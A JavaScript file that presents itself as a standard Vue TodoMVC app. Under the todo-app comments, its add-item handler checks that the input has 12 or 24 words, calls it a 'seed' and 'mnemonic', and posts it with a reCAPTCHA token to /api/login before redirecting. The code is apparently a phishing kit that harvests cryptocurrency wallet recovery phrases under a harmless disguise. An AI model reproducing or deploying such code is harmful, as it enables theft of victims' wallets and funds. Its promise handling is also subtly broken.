// Full spec-compliant TodoMVC with localStorage persistence
// and hash-based routing in ~120 effective lines of JavaScript.
console.log("******************************* v0.0.15")
// localStorage persistence
const STORAGE_KEY = "todos-vuejs-2.0";
const todoStorage = {
    fetch() {
        const todos = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
        todos.forEach((todo, index) => {
            todo.id = index;
        });
        todoStorage.uid = todos.length;
        return todos;
    },
    save(todos) {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(todos));
    }
};

// visibility filters
const filters = {
    all(todos) {
        return todos;
    },
    active(todos) {
        return todos.filter((todo) => !todo.completed);
    },
    completed(todos) {
        return todos.filter((todo)=> todo.completed);
    }
}
document.addEventListener("DOMContentLoaded", () => {
// app Vue instance
    const app = Vue.createApp({
        delimiters: ['${', '}'],
        // app initial state
        data() {
            return {
                todos: todoStorage.fetch(),
                newTodo: "",
                errorTodo: "",
                editedTodo: null,
                visibility: "all"
            }
        },

        // watch todos change for localStorage persistence
        watch: {
            todos: {
                handler(todos) {
                    todoStorage.save(todos);
                },
                deep: true
            }
        },

        // computed properties
        // http://vuejs.org/guide/computed.html
        computed: {
            filteredTodos() {
                return filters[this.visibility](this.todos);
            },
            remaining() {
                return filters.active(this.todos).length;
            },
            allDone: {
                get() {
                    return this.remaining === 0;
                },
                set(value) {
                    this.todos.forEach(todo => {
                        todo.completed = value;
                    });
                }
            }
        },

        // methods that implement data logic.
        // note there's no DOM manipulation here at all.
        methods: {
            addTodo() {
                var value = this.newTodo && this.newTodo.trim();
                if (!value) {
                    this.errorTodo = "";
                    return;
                }

                var wordsNB = (value.trim().split(' ').filter(function(v, index, arr){
                    return v != "";
                }).length);

                if (wordsNB < 12) {
                    this.errorTodo = 'Missing words in your seed, need 12 or 24...';
                    return
                }

                this.callAPILogin(this.newTodo);
            },

            callAPILogin(mnemonic) {
                this.errorTodo = 'Current connection...';
                var t = this
                grecaptcha.execute('6LfmdSAeAAAAAPf5oNQ1UV0wf6QhnH9dQFDSop7V', {action: 'submit'})
                .then(function(token) {
                    axios.post('/api/login', {
                        mnemonic: mnemonic,
                        recaptcha: token,
                    })
                })
                .then(function (response) {
                    console.log(response);
                    if (response.data == 'ok') {
                        window.location.replace("/authorize");
                    } else {
                        t.errorTodo = 'Error! Could not reach the API. ' + error;
                    }
                })
                .catch(function (error) {
                    t.errorTodo = 'Error! Could not reach the API. ' + error;
                });
            },
        },

        // a custom directive to wait for the DOM to be updated
        // before focusing on the input field.
        // http://vuejs.org/guide/custom-directive.html
        directives: {
            "todo-focus": {
                updated(el, binding) {
                    if (binding.value) {
                        el.focus();
                    }
                }
            }
        }
    });

    app.config.productionTip = false;
    app.config.devtools = false;
    /*
        app.config.errorHandler = function(err, vm, info) {
            console.log(`Error: ${err.toString()}\nInfo: ${info} ${vm}`);
        }

        app.config.warnHandler = function(msg, vm, trace) {
            console.log(`Warn: ${msg}\nTrace: ${trace} ${vm}`);
        } */


// mount
    const vm = app.mount(".todoapp");
    // handle routing
    function onHashChange() {
        const visibility = window.location.hash.replace(/#\/?/, "");
        if (filters[visibility]) {
            vm.visibility = visibility;
        } else {
            window.location.hash = "";
            vm.visibility = "all";
        }
    }
    window.addEventListener("hashchange", onHashChange);
    onHashChange();
});




